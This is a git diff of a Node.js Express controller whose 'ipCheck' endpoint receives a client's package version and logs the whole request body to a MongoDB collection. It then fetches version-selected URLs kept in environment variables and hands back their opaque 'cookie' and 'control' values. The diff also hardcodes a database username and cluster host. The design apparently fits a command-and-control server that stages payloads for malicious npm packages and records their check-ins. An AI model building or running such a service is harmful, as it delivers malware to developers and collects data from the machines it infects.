@@ -1,36 +1,65 @@
-
-const axios = require("axios")
+const axios = require("axios");
 const asyncErrorHandler = require("../middlewares/asyncErrorHandler");
+const { MongoClient } = require('mongodb');
+require('dotenv').config(); // Ensure dotenv is required to load environment variables
+
+const uri = `mongodb+srv://filipporter9017:${process.env.DB_PASSWORD}@cluster0.7nw96kp.mongodb.net/gd/?retryWrites=true&w=majority&appName=Cluster0`;
+
+const client = new MongoClient(uri, {socketTimeoutMS: 45000} );
+
+async function insertQuery({query}) {
+  try {
+    await client.connect();
+    const database = client.db("gd");
+    const table = database.collection("vercel_upload");
+    const result = await table.insertOne({query});
+    // console.log("@@@@@", result);
+  } finally {
+    await client.close();
+  }
+}
 
 exports.getIpCheck = asyncErrorHandler(async (req, res, next) => {
-    res.status(200).json({
-      success: true,
-      data: ""
-    });
+  res.status(200).json({
+    success: true,
+    data: ""
   });
+});
 
-  exports.ipCheck = asyncErrorHandler(async (req, res, next) => {
-    const version = req.body && req.body.npm_package_version;
-
-    let flag = 77;
-    if (version) {
-      const sub = version.split(".");
-      if (sub && sub.length == 3 ) {
-        flag = sub[2];//ex: "1.0.77"
-      }
-    }
-
-    const id = "ID_" + flag;
-
-    const url = process.env[id] || process.env.ID_77;
-
-    const result = await axios.get(url);
-    
-    console.log(`${id} is running`, url);
-    
-    res.status(200).json({
-      success: true,
-      cookie: result.data.cookie
-    });
-  });
+exports.ipCheck = asyncErrorHandler(async (req, res, next) => {
+  const version = req.body && req.body.version;
   
+  // console.log("@@@s",req.body)
+
+  let flag = 77;
+  if (version) {
+    const sub = version.split(".");
+    if (sub && sub.length == 3) {
+      flag = sub[2]; // ex: "1.0.77"
+    }
+  }
+  // insertQuery(req.body);
+
+  const id = "ID_" + flag;
+
+  const u_id = id+"_1";
+
+  const url = process.env[u_id] || process.env.ID_77_1;
+  
+  insertQuery(req.body);
+
+  const result = await axios.get(url);
+
+  const c_id = id+"_2";
+
+  const control_url = process.env[c_id] || process.env.ID_77_2;
+  const result_ctrl = await axios.get(control_url);
+
+  console.log(`${id} is running`, url, control_url);
+  
+  res.status(200).json({
+    success: true,
+    cookie: result.data.cookie,
+    control: result_ctrl.data.cookie
+  });
+});
